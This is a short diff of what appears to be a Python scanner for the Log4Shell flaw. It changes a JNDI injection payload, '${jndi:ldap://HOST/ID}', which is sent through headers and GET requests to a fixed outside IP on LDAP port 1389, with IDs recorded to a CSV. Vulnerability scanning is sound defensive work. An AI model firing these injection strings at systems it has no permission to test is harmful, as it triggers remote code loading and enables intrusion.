@@ -3,7 +3,7 @@ import uuid
 import tests
 
 TESTING_HOST = "141.94.246.79:1389"
-TESTING_PAYLOAD = "${jndi:ldap://HOST/reply-ID}"
+TESTING_PAYLOAD = "${jndi:ldap://HOST/ID}"
 OUTPUT_FILE = "ids.csv"
 TESTS_LIST = [("Headers", tests.test_header),
               ("GET", tests.test_get),
